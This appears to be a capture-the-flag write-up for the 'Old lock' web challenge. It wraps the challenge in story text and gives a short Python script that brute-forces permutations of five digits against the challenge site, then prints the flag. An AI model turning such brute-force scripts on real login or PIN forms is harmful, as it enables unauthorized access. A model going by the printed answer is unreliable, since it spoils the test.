[../](../)

# Singapore - Harbour

> Boy this has been a tough journey, you had luck that you entered a box that contained some food. You hear foul voices and feel that some people pick up your box, and carry it to another place. When the voices disappear, you take the chance to escape. You have successfully arrived in Singapore. You find a peaceful café, order a cup of tea and charge your cell phone. PLING, you’ve received another text message from the boss: "I pretend that I don’t know where you are, but I do. You’ll have to forgive me, but I’ve had a tracker on you all the time. You have finally reached Singapore, find "M/S. Revenger" and sneak onboard, it will take you to our enemy's hidden island, make it quick, the ship is leaving the harbor soon, I count on you AGENT!." Look, overthere "M/S Revenger", you have to get closer! Hmm, but it seems quite guarded. You will have to swim! You go away from the ship and dive into the warm and clear water. It’s nice to go for a swim but you would have preferred it to be under more relaxed circumstances. You swim slowly towards the ship, finally you reach it, climb up on the side of it and in through a window. You find yourself in a cabin with locked doors. Thankfully, it's an electronic lock.

## Challenge: Old lock (web)

> You're not sure what metal the keypad was made of, but either it was very soft, or whoever punches in the code has waay too much strength in their fingers. This also means you're in luck, since it's pretty obvious which digits are actually used in the 5-digit code. The order is unknown, but there can't be that many possibilities, right? Note: Online brute forcing is allowed in this task.

> https://old-lock-web.2021.ctfcompetition.com/

## Solution

In this web challenge, you have to break a 5-digit code while knowing all 5 candidates based on the usage of the keypad.
By brute-forcing all permutations, you find the correct key.

```python
from itertools import permutations
import requests

for x in permutations([3,5,7,8,0], 5):
    print(f"Trying {x} ...")
    response = requests.post("https://old-lock-web.2021.ctfcompetition.com/", data={"v": "".join([str(d) for d in x])})
    if "Hmm" not in response.text:
        print("Found!")
        break
```

flag: `CTF{IThinkWeNeedToReplaceTheKeypad}`

> After having climbed through the window, and unlocking the door, you enter a corridor, hey wait! An armed guard is patrolling your way, what are you doing?

> Hide behind a barrel (13): You quickly dive in behind a barrel and try to hide from the guard. Let’s hope they don’t detect you.

> Try to disarm the guard (14): There’s no time to hide, and as the saying goes: a good defense is a good offense. You jump the guard trying to take him out before he can call for reinforcements.